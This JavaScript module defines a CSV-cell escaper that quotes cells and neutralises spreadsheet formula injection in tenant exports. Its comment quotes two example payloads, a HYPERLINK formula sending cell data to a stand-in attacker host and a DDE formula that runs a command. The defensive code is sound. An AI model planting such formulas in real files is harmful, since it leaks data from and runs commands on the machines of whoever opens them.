// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Aaron K. Clark
"use strict";

/**
 * CSV-cell escaper shared by the export controllers.
 *
 * Two protections layered into a single helper:
 *
 *   1. Quote-wrap every cell and double any embedded `"` so values
 *      containing commas, newlines, or quotes don't break the
 *      grid structure. Simpler than detecting which values "need"
 *      quoting; the perf cost is negligible for export-sized rows.
 *
 *   2. Defuse CSV-formula injection (OWASP-recognized class). If a
 *      cell starts with `=`, `+`, `-`, `@`, tab (0x09), or CR (0x0D),
 *      Excel / LibreOffice / Google Sheets treat the cell as a
 *      formula on import — including legacy exfil patterns like
 *      `=HYPERLINK("http://attacker/?d="&A1, "click")` and
 *      `=cmd|'/c calc'!A1`. Since the export tables include
 *      free-text fields supplied by any authenticated tenant
 *      (`teDescription`, `custCompanyName`, etc.), a malicious
 *      caller could plant a payload that fires when a co-tenant
 *      operator opens the export. Prefix triggered cells with a
 *      single quote so the spreadsheet engine treats the value
 *      as a literal string. The leading `'` is visible when
 *      viewed as plain text but invisible inside a spreadsheet
 *      cell — the accepted tradeoff vs. silent code execution.
 *
 * Inputs:
 *   val: anything. `null`/`undefined` collapse to `""`. Date
 *        instances serialize via toISOString(); everything else
 *        through String().
 *
 * Output:
 *   A complete quoted cell value, including surrounding `"`. Does
 *   NOT add the trailing comma — the caller handles row assembly.
 */
function escapeCsvCell(val) {
    if (val === null || val === undefined) return '""';
    let s = (val instanceof Date) ? val.toISOString() : String(val);
    // Formula-trigger characters: =, +, -, @, tab, carriage return.
    // The match is on the FIRST char only — the rest of the cell
    // is irrelevant to whether the spreadsheet engine evaluates it.
    if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
        s = "'" + s;
    }
    return '"' + s.replace(/"/g, '""') + '"';
}

module.exports = { escapeCsvCell };
